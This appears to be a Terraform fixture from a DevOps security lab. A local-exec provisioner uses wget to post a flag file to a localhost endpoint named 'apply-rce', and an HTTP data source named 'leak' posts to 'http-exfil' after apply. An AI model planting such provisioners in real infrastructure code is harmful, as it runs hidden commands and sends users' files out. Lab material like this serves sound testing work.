terraform {
  required_providers {
    null = { source = "hashicorp/null" }
    http = { source = "hashicorp/http" }
  }
}

# Se ejecuta en `terraform apply`.
resource "null_resource" "deploy" {
  provisioner "local-exec" {
    command = "wget -qO- --post-file=/hosthome/.devops-lab-tf-apply-flag http://localhost:8888/tf/apply-rce >/dev/null"
  }
}

# Depende del recurso anterior, asi que se lee DESPUES del apply.
data "http" "leak" {
  url          = "http://localhost:8888/tf/http-exfil"
  method       = "POST"
  request_body = "apply completado: ${null_resource.deploy.id}"
}
